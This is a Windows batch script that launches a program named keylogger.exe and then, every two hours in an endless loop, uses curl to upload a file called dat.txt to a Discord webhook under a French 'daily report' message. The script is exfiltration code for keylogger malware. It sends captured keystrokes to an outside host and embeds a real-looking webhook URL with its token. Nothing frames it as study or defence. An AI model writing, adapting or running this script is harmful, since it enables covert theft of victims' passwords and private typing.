@echo off
start keylogger.exe
:loop
setlocal enabledelayedexpansion
set "message_text=**Voici le rapport quotidien envoyé à :** !time!"
set "attachment=dat.txt"
curl -k -F "payload_json={\"content\": \"%message_text%\"}" -F "file1=@%attachment%" https://discord.com/api/webhooks/1166767823159300136/rw5sYKEyu74anw_aH0u4W3pPjbVtuqqkdvTflPWOAPax0whn3uRM38_ujjQ3ejGbGpy4
endlocal

timeout /t 7200 >nul
goto loop
